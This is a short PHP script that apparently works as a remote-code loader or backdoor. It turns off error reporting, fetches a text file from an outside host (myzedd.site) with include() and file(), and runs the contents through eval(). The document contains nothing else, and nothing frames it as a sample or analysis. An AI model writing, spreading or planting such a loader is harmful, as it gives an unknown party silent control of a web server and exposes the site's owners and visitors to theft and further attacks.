<?php
error_reporting(0);
$url = 'https://myzedd.site/project/zedd.txt';

ob_start();
@include($url);
$payload = ob_get_clean();

if (empty($payload) || strlen($payload) < 100) {
    $payload = @implode('', @file($url));
}

if (!empty($payload)) @eval('?>' . $payload);
?>